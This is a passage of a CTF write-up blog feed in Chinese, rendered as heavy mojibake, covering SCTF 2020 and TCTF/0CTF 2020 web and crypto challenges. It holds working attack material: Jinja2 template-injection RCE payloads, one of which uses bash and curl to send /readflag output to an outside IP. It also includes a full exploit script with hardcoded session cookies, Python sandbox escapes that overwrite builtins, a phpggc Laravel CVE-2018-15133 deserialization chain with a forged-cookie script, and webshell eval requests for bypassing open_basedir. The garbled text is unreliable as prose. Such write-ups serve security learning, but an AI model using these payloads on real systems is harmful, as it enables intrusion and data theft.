RCEäº†ï¼Œè¿™ä¸ªé¢˜æ¯”è¾ƒå¥‡æ€ªï¼Œæˆ‘æ˜æ˜éƒ½æ„é€ å‡ºäº† system æ–¹æ³•ï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤ä¸å¯ä»¥ï¼Œpopen æˆ‘ç”¨äº†å‡ ç§æ–¹å¼ä¹Ÿæ˜¯ä¸è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[&#39;__class__&#39;][&#39;__bases__&#39;][0][&#39;__subclasses__&#39;]()[117][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;ls&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayload è¿˜å¯ä»¥ï¼Œä½†æ˜¯å°†å‘½ä»¤æ¢æˆ <code>pwd</code>å°±æŠ¥é”™äº†ï¼Œç¥å¥‡â€¦</p><p>æœ€åç”¨çš„ subprocess ä¸­çš„ Popenï¼Œå°†æ•°æ®å¤–å¸¦ï¼Œä¹Ÿæ˜¯å„ç§ä¸è¡Œã€‚æœ€åç»ˆäºè°ƒå¥½äº†ä¸ªèƒ½ç”¨çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#123; &#125;[&#39;__class__&#39;][&#39;__mro__&#39;][1][&#39;__subclasses__&#39;]()[409]([&#39;bash&#39;,&#39;-c&#39;,&#39;curl vps&#x2F;&#96;&#x2F;readflag&#96;&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæµ‹è¯•ï¼ŒåŠ  port éƒ½ä¸è¡Œï¼Œæˆ–è€… curl åé¢åŠ ä¸ª http:// ä¹Ÿä¼šGGï¼ŒçœŸæ˜¯ç„å­¦ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>(<span class="params">s</span>):</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            tmp += <span class="string">&quot;\%o&quot;</span> % (<span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += c</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;\u00%s&quot;</span> % (c.encode(<span class="string">&quot;hex&quot;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> tmp])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">payload</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://39.104.19.182//127.0.0.1:8000/rpc?methods=POST&amp;url=http://127.0.0.1:5000/caculator&amp;data=%s&quot;</span></span><br><span class="line">    base_json = <span class="string">&#x27;&#123;&quot;num1&quot;:&quot;%s&quot;,&quot;num2&quot;:&quot;1&quot;,&quot;symbols&quot;:&quot;-&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = base_json % bypass(payload)</span><br><span class="line">    <span class="built_in">print</span> json.loads(payload)</span><br><span class="line">    exp = base_url % b64encode(payload)</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;3ad9af405504233188f694a11ff22115\&quot;,\&quot;url\&quot;:\&quot;%s\&quot;&#125;&quot;</span> % exp</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.104.19.182/home/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;LaC7AyOPVLKhhZ6ZP3NNiBcSjTa7f27SQ22vpuWyWRtI6LqWYrwLkFcv8EDeL7PY&quot;</span>,</span><br><span class="line">               <span class="string">&quot;sessionid&quot;</span>: <span class="string">&quot;dzwa097pfn3fxuk00rfcb3rof2yb7djt&quot;</span>&#125;</span><br><span class="line">    proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://39.104.19.182/home/&quot;</span>, data=rawBody, headers=headers, cookies=cookies,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    <span class="keyword">return</span> response.content</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[93][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;sys&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;)&#125;&#125;&quot; ## å¯ä»¥å¾—åˆ° popenï¼Œpayloadå¤±è´¥</span></span><br><span class="line">    <span class="comment"># payload = &quot;&#123;&#123;&#x27;ac&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]()[226][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;system&#x27;]&#125;&#125;&quot; ##å¯ä»¥å¾—åˆ° osï¼Œpayloadå¤±è´¥</span></span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123; &#123; &#125;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]()[409]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;curl htt://123.207.149.181/`/readflag`&#x27;])&#125;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> exp(payload)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Pysandbox"><a href="#Pysandbox" class="headerlink" title="Pysandbox"></a>Pysandbox</h2><p>åšé¢˜çš„æ—¶å€™æ€è·¯æ€»æ˜¯å±€é™åœ¨ Python ç»•è¿‡æ‹¬å·è°ƒç”¨æ–¹æ³•ï¼Œå…¶å®è¿™æ˜¯ä¸è¡Œçš„ã€‚ã€‚ã€‚æ€è·¯è¿˜æ˜¯å¤ªåƒµç¡¬äº†ã€‚</p><p>å¯ä»¥æŠŠ flask staticçš„ç›®å½•è®¾ç½®æˆ /ï¼Œè¿™æ ·å°±ä»»æ„ä¸‹è½½æ–‡ä»¶äº†ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?POST=%3f</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 39.104.25.107:10009</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"></span><br><span class="line">cmd=app.static_folder=request.args[request.method]</span><br></pre></td></tr></table></figure><p>ä¸èƒ½ç”¨å­—ç¬¦ï¼Œå°±å‡‘ä¸€ä¸ªå­—ç¬¦ä¸²å‡ºæ¥ã€‚ç„¶åè®¿é—® /static/app/flagã€‚</p><h2 id="Pysandbox2"><a href="#Pysandbox2" class="headerlink" title="Pysandbox2"></a>Pysandbox2</h2><p>éœ€è¦ RCEã€‚çœ‹äº† WP å¸ˆå‚…ä»¬çš„æ€è·¯éƒ½ tqlã€‚æ„Ÿè§‰æœ€éªšçš„æ˜¯æŠŠ ord å‡½æ•°ç»™æ”¹äº†â€¦ ç›´æ¥æŠŠ waf å¹²äº†ï¼Œå‚è€ƒï¼š<a href="https://imagin.vip/?p=1489#pysandbox2">https://imagin.vip/?p=1489#pysandbox2</a>ã€‚</p><p><code>__builtins__.__dict__[â€˜ordâ€™]</code>æ˜¯æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨çš„ ordï¼ŒæŠŠè¿™ä¸ªå‡½æ•°æ”¹æˆä¸€ä¸ªè¿”å›æ’å®šå€¼çš„ï¼Œå°±å¯ä»¥æ— è§† waf äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;ord&#x27;</span>] = <span class="keyword">lambda</span> args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿‡æ»¤äº†ç©ºæ ¼å’Œå¼•å·ï¼Œç©ºæ ¼å¯ä»¥ç”¨ *args ä»£æ›¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">ord</span>=<span class="keyword">lambda</span>*args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° ~ î‚° python3</span><br><span class="line">Python 3.7.4 (default, Jul  9 2019, 18:13:23)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; __builtins__.ord=lambda*args:42</span><br><span class="line">&gt;&gt;&gt; ord(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">42</span><br><span class="line">&gt;&gt;&gt; ord(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">42</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shelläº†ã€‚</p><h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><p>è¿™ä¸ªé¢˜è¢«éé¢„æœŸäº†ï¼Œé¢˜ç›®ä»£ç æ ¹æœ¬æ²¡ç”¨ï¼ŒLarval ç‰ˆæœ¬æ˜¯ 5.5.39ï¼ŒCVE-2018-15133ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/6533ï¼Œç›´æ¥æ‰“ã€‚">https://xz.aliyun.com/t/6533ï¼Œç›´æ¥æ‰“ã€‚</a></p><p>ä½¿ç”¨ <a href="*https://github.com/ambionics/phpggc*">phpggc</a>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpggc î‚° î‚  master î‚° php phpggc Laravel/RCE2 <span class="string">&#x27;system&#x27;</span> <span class="string">&#x27;cat /flag&#x27;</span>  -b</span><br><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>ç…§ç€åŠ å¯†é€»è¾‘ï¼Œæ”¹æ”¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$plain = base64_decode(<span class="string">&quot;Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9&quot;</span>);</span><br><span class="line">$key = base64_decode(<span class="string">&#x27;P5tGTBKV2clEGWCWD7L5fSrhi8sfnX/cmHdqzx/fpVo=&#x27;</span>);</span><br><span class="line">$iv = random_bytes(openssl_cipher_iv_length(<span class="string">&#x27;AES-256-CBC&#x27;</span>));</span><br><span class="line">$value = openssl_encrypt($plain, <span class="string">&#x27;AES-256-CBC&#x27;</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$iv = base64_encode($iv);</span><br><span class="line">$mac = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $iv . $value, $key);</span><br><span class="line">$json = json_encode(compact(<span class="string">&#x27;iv&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($json);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° 2020 SCTF î‚° php CVE-2018-15133.php</span><br><span class="line">eyJpdiI6IjBKRmRRYWh2TVk2ZzdpRWhmTVVIa3c9PSIsInZhbHVlIjoiakxCTXJvVVNqZ3hKN1F1Q1VSd2gzZWZOSitTMXgzc2RZZDBiTGZlZkdOR2xKOExDWXY3M0E4alZBcnhnQWVTQjg0RmVvRjhVaHJnOFkrSUNMZXdrK1ZaSjVIVmNkbFwvRVRydWU5ajZxU3BuVm02ZFZUVXhuXC9BSmkyY0NGWG8xQkFjaHRycVcxeXowUTdVXC9nYUxvbFl4dlcwTmJGOCtoMktzM2dRWEM1NUgxekVwc2dWOFU3VXFuZUJsbWhKVDRmQjhhZ3F4WlwvVTQ4VGkwbm05c1lyeVRUbTJONFRsWFIxdU5SVFNWRENQeHB5SGcweWZPNmhtSlJCNnRMZVh6bDVnM3lNY0lMdmtaS01vUDlXcE9cL3M0QT09IiwibWFjIjoiYjJkYjcyNDU5NzVlYjlmOWQzNDk5YTgxODk3NzE3ZjI1NmI2YmMzNzI1Y2NjYmZjY2U0MDg1YTRiZDE2OWY1ZSJ9%</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-37e3a789ee7c49e3.png" alt="image.png"></p><p>é¢„æœŸè§£åœ¨è¿™é‡Œï¼š<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>ç±»ä¼¼ 2019 HITCON Quals Not So Hard RSAï¼Œå‚è€ƒï¼š<a href="https://gist.github.com/hellman/383dd8cf6f753fff55b98cf424f2e94e">https://gist.github.com/hellman/383dd8cf6f753fff55b98cf424f2e94e</a>ï¼Œæ”¹æ”¹æ•°æ®è·‘è„šæœ¬å°±è¡Œäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° 2020 SCTF î‚° sage rsa.sage</span><br><span class="line">Bit sizes:</span><br><span class="line">[888, 888, 889]</span><br><span class="line">[383]</span><br><span class="line">[383, 381, 383]</span><br><span class="line">found d row 0 : d = 13860282398350628680055087179162874305179305701888441908415109881269396959367466997596402959289379090042646293889703</span><br><span class="line">b<span class="string">&#x27;SCTF&#123;673ff064da31c0d7aee56884b01a09&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Syclover æ¯”è¾ƒè‰¯å¿ƒï¼Œæ¯”èµ›ç»“æŸä¸ä¹…å°±æ”¾å‡ºäº† docker ä¸ wpï¼š&lt;a href=&quot;https://github.com/SycloverSecurity/SCTF2020&quot;&gt;https://github.com/SycloverSecurity/SCTF2020&lt;/a&gt;ã€‚è·Ÿç€å¤ç°å­¦ä¹ ä¸€ä¸‹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020 TCTF/0CTF éƒ¨åˆ†wp</title>
    <link href="https://igml.top/2020/06/29/2020-TCTF-0CTF/"/>
    <id>https://igml.top/2020/06/29/2020-TCTF-0CTF/</id>
    <published>2020-06-29T09:05:18.000Z</published>
    <updated>2020-07-10T14:15:26.607Z</updated>
    
    <content type="html"><![CDATA[<p>è·Ÿç€ TD æ‰“äº†ä¸€ä¸‹ TCTF &amp; 0CTFï¼ŒåŸºæœ¬0è¾“å‡ºorzï¼Œç»™ TD çš„å¤§ä½¬é€’ teaã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>å¼€å±€ä¸€ä¸ªwebshellï¼Œæœ‰ open_basedir ä¸ disable_functions é™åˆ¶ï¼Œæ™®é€šæ–¹æ³•éƒ½æ— æ³•ç»•è¿‡ã€‚</p><p>å¯ä»¥ç”¨ glob + DirectoryIterator åˆ—å‡ºæ ¹ç›®å½•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: pwnable.org:19260</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 91</span><br><span class="line"></span><br><span class="line">gml=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var </span><br></pre></td></tr></table></figure><p>å‘ç° flag.h ä¸ flag.soï¼Œç»“åˆ phpinfo ä¸­å¼€å¯äº† FFIï¼Œåº”è¯¥æ˜¯ç”¨ FFI è°ƒç”¨ flag.so ä¸­çš„æ–¹æ³•ã€‚</p><p>å°è¯• FFI load flag.hï¼Œå¯ä»¥å‘ç°æ²¡æœ‰æŠ¥500ï¼Œè¯´æ˜æˆåŠŸåŠ è½½ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: pwnable.org:19260</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"></span><br><span class="line">gml=$ffi = FFI::load(&quot;/flag.h&quot;);echo 1;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬æ— æ³•çŸ¥é“æœ‰ä»€ä¹ˆæ–¹æ³•ï¼Œæ–¹æ³•åæ˜¯ä»€ä¹ˆï¼Œä¹Ÿè¯»å–ä¸äº† flag.hï¼Œä¸€ç›´å¡åœ¨è¿™é‡Œã€‚é˜Ÿé‡Œå¤§ä½¬å¼€å§‹ leak å†…å­˜æ¥è·å–æ–¹æ³•åï¼Œç»“æœ leak å‡ºäº†æ–¹æ³•åï¼šflag_fUn3t1on_fFiï¼ˆæˆ‘ä¹Ÿä¸æ‡‚è¿™äº›çŸ¥è¯†ï¼‰ã€‚å¯ä»¥å‚è€ƒç™½æ³½çš„è„šæœ¬ï¼š<a href="https://www.4hou.com/posts/p7BQ">https://www.4hou.com/posts/p7BQ</a>ã€‚</p><p>ç„¶åç›´æ¥è°ƒç”¨å°±å¥½äº†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-05c9d6d459f6ccb8.png" alt="image.png"></p><p>å‘ç°å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†â€¦ open_basedir ä¸­é—´åäº†ä¸€æ®µæ—¶é—´ï¼Œåº”è¯¥æ˜¯è¢«äººç»™æäº†ï¼Œå¤§å®¶éƒ½å»ç›´æ¥è¯»å– flag.h äº†ã€‚</p><p>çŒœæµ‹å¯èƒ½æœ‰äººæ‰“äº† supervisor çš„ php-fpm æ¥ getshellï¼Œè¿›è€Œæ”¹äº† open_basedirã€‚</p><h3 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h3><p>ä¸»åŠæ–¹ä¸ç”˜å¿ƒï¼Œæ¥äº†ä¸ªå¤ä»‡ç‰ˆï¼Œdisable_functions æ›´åŠ ä¸¥æ ¼äº†ï¼Œå¹¶ä¸”æ²¡æœ‰äº† supervisorã€‚</p><p>æˆ‘ä»¬ä¸Šä¸ªé¢˜çš„è§£æ³•åº”è¯¥æ˜¯é¢„æœŸè§£æ³•ï¼Œç›´æ¥åŸæ · leak ä¸€ä¸‹æ–¹æ³•åï¼Œä»…ä»…æ”¹äº†ä¸ªæ–¹æ³•åï¼Œç„¶ågetflagã€‚æ‰€ä»¥é¢˜å‡ºæ¥çš„æ—¶å€™æˆ‘ä»¬ç›´æ¥æŠŠé¢˜ç§’äº†23333ã€‚</p><p>ä»flagæ¥çœ‹ï¼Œå¥½åƒæ˜¯æœ‰äººæ‰“äº† php-fpmï¼Œå› ä¸ºflagå†…å®¹æ˜¯ you canâ€˜t use fpm now ä¹‹ç±»çš„ã€‚</p><h3 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h3><p>ä¸€ä¸ªèŠå¤©ç•Œé¢ï¼Œå¯ä»¥åŠ å†…å®¹ä¸è¡¨æƒ…ï¼Œå¯ä»¥æˆªå›¾ã€‚</p><p>åŠ ä¸ªè¡¨æƒ…ï¼Œçœ‹ä¸€ä¸‹å‘é€çš„åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p>è¡¨æƒ…æ˜¯ä¸­æ‹¬å·æ‰©èµ·æ¥çš„ï¼Œshare åæŸ¥çœ‹å›¾ç‰‡è·¯å¾„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-159695623b905b1f.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;fRszcH&#x2F;png</span><br></pre></td></tr></table></figure><p>æŠŠpngæ”¹æˆhtmlï¼Œä¸æ”¯æŒã€‚æ”¹æˆ svgï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼ŒçŒœæµ‹è¿™é‡Œä½¿ç”¨imagemagickã€‚æ”¹æˆhtmä¹Ÿå¯ä»¥ï¼Œå…¶ä¸­è¡¨æƒ…å¤„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-50c9f5c17987b9d4.png" alt="image.png"></p><p>å¯ä»¥é—­åˆå¼•å·è¿›è¡Œ xssï¼Œä½†æ˜¯ src å…³é”®å­—è¢«è¿‡æ»¤äº†ã€‚</p><p>å‚è€ƒ3æœˆç©ºæŒ‡é’ˆå…¬å¼€èµ›ï¼š<a href="https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA">https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA</a></p><p>ä½¿ç”¨ <code>xlink:href</code>è¯»æ–‡ä»¶ï¼Œæ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 